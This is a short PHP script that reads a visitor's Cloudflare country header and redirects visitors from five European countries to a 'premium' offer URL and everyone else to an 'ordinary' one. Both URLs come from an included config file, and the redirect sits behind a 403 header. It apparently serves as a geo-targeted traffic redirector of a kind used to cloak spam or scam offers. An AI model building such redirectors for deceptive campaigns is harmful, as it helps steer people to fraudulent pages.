<?php
header("HTTP/1.1 403 Forbidden");
include($_SERVER['DOCUMENT_ROOT']."/PENGATURAN/config.php");
$file = $_GET['file'];
$cc = trim($_SERVER["HTTP_CF_IPCOUNTRY"]);
if ($cc == "CH"||$cc == "BE"||$cc == "DK"||$cc == "NO"||$cc == "FR") 
{
$offer = ''.$Premium.'';
}
else
{
$offer = ''.$Biasa.'';
}
header('Location: '.$offer.'');
die();
?>
